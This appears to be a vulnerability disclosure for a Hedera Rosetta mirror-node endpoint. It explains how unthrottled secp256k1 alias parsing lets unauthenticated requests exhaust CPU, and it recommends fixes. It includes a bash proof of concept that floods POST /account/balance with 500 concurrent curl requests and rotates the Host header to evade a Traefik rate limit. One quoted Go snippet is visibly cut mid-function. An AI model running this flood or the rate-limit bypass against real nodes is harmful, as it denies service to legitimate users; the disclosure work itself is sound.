### Title
Unauthenticated CPU Exhaustion via Unbounded Cryptographic Key Parsing in AccountBalance

### Summary
The `AccountBalance()` endpoint unconditionally invokes `NewPublicKeyFromAlias()` → `hiero.PublicKeyFromBytes()` on every request that supplies a hex-prefixed alias address, performing elliptic-curve point decompression (a modular exponentiation over a 256-bit prime) with no application-level rate limiting, no caching, and no authentication. An unprivileged attacker can flood this endpoint with valid secp256k1 alias addresses to drive sustained CPU consumption well above the 30% threshold on the processing node.

### Finding Description

**Exact code path:**

`AccountBalance()` at [1](#0-0)  calls `types.NewAccountIdFromString()`.

`NewAccountIdFromString()` at [2](#0-1)  detects the `0x` prefix, hex-decodes the bytes, and delegates to `NewAccountIdFromAlias()`.

`NewAccountIdFromAlias()` at [3](#0-2)  unconditionally calls `NewPublicKeyFromAlias(alias)`.

`NewPublicKeyFromAlias()` at [4](#0-3)  proto-unmarshals the alias, extracts the raw key bytes, and calls `hiero.PublicKeyFromBytes(rawKey)` at [5](#0-4)  — which for secp256k1 performs full point decompression (modular square root via 256-bit modular exponentiation) and for Ed25519 performs curve-point decoding (also modular exponentiation). Both are expensive per-call operations.

**Root cause / failed assumption:** The implementation assumes that callers are either few or trusted. There is no parsed-key cache, no application-level rate limiter, and no authentication gate anywhere in the Rosetta Go server middleware stack. [6](#0-5) 

**Why existing checks fail:** The only rate-limiting configuration is in the optional Traefik Helm chart: [7](#0-6)  This is (a) only present in Kubernetes deployments that use this chart, (b) keyed on `requestHost` rather than source IP, making it trivially bypassable by rotating the `Host` header, and (c) entirely absent at the application layer — confirmed by zero matches for any rate-limiting or caching construct in the rosetta Go source.

### Impact Explanation
Every `POST /account/balance` request with a `0x`-prefixed secp256k1 alias triggers a full elliptic-curve point decompression (≈ one 256-bit modular exponentiation). With no application-level throttle, an attacker sending hundreds of concurrent requests per second can saturate one or more CPU cores on the mirror node, degrading or denying service to all other Rosetta consumers. The impact is proportional to the attacker's network bandwidth and is achievable from a single machine.

### Likelihood Explanation
The endpoint is publicly reachable with no credentials. The attacker needs only a single valid secp256k1 public key alias (a 35-byte protobuf blob, hex-encoded with `0x` prefix), which is a static value reusable across all requests. No brute-force or guessing is required. The attack is trivially scriptable with any HTTP load-testing tool (e.g., `wrk`, `hey`, `ab`). The Traefik rate limit of 10 req/s per `requestHost` is bypassable by rotating the `Host` header value, and is absent entirely in non-Kubernetes deployments.

### Recommendation
1. **Application-level rate limiting:** Add a per-IP token-bucket or sliding-window rate limiter as Go middleware in `rosetta/main.go`, applied before routing, so it cannot be bypassed by infrastructure configuration changes.
2. **Parse-result caching:** Cache the result of `NewPublicKeyFromAlias()` keyed on the raw alias bytes (e.g., using a bounded LRU cache in `NewAccountIdFromAlias()`). Repeated requests for the same alias — the common case in a flood — would then incur only a map lookup.
3. **Input size cap:** Reject alias byte slices above the maximum valid size (33 bytes for secp256k1, 32 for Ed25519) before invoking any cryptographic parsing.

### Proof of Concept

**Precondition:** Rosetta node reachable at `$HOST:$PORT`. Obtain or generate any valid secp256k1 alias (protobuf-encoded `Key` with `ECDSASecp256K1` field, hex-encoded). A known static example works.

```bash
# 1. Encode a valid secp256k1 public key as a protobuf alias (hex, 0x-prefixed).
#    Field tag 0x3a = field 7 (ECDSASecp256K1), wire type 2 (length-delimited).
#    33-byte compressed secp256k1 key: 02 + 32 bytes of x-coordinate.
ALIAS="0x3a2102$(python3 -c "import secrets; print(secrets.token_hex(32))")"
# (In practice, use a real valid point; an invalid x-coord will fail point decompression
#  but still invoke the expensive hiero.PublicKeyFromBytes call before returning error.)

# 2. Flood the endpoint with concurrent requests.
for i in $(seq 1 500); do
  curl -s -X POST http://$HOST:$PORT/account/balance \
    -H "Content-Type: application/json" \
    -H "Host: attacker-$i.example.com" \
    -d "{
      \"network_identifier\": {\"blockchain\": \"Hedera\", \"network\": \"mainnet\"},
      \"account_identifier\": {\"address\": \"$ALIAS\"}
    }" &
done
wait

# 3. Observe CPU usage on the mirror node spike above 30% sustained.
```

Each request independently triggers `NewPublicKeyFromAlias()` → `hiero.PublicKeyFromBytes()` with no caching or throttle. Rotating the `Host` header bypasses the Traefik `requestHost`-keyed rate limit.

```go
func NewAccountIdFromAlias(alias []byte, shard, realm int64) (zero AccountId, _ error) {
	if shard < 0 || realm < 0 {
		return zero, errors.Errorf("shard and realm must be positive integers")
	}

	curveType, publicKey, err := NewPublicKeyFromAlias(alias)
	if err != nil {
		return zero, err
	}

		accountId: domain.EntityId{ShardNum: shard, RealmNum: realm},
		alias:     alias,
		aliasKey:  &publicKey.PublicKey,
		curveType: curveType,
	}, nil
}
```

```go
func NewPublicKeyFromAlias(alias []byte) (zeroCurveType types.CurveType, zeroPublicKey PublicKey, _ error) {
	if len(alias) == 0 {
		return zeroCurveType, zeroPublicKey, errors.Errorf("Empty alias provided")
	}

	var key services.Key
	if err := proto.Unmarshal(alias, &key); err != nil {
		return zeroCurveType, zeroPublicKey, err
	}

	var curveType types.CurveType
	var rawKey []byte
	switch value := key.GetKey().(type) {
	case *services.Key_Ed25519:
		curveType = types.Edwards25519
		rawKey = value.Ed25519
	case *services.Key_ECDSASecp256K1:
		curveType = types.Secp256k1
		rawKey = value.ECDSASecp256K1
	default:
		return zeroCurveType, zeroPublicKey, errors.Errorf("Unsupported key type")
	}

	publicKey, err := hiero.PublicKeyFromBytes(rawKey)
	if err != nil {
		return zeroCurveType, zeroPublicKey, err
	}

	return curveType, PublicKey{publicKey}, nil
```
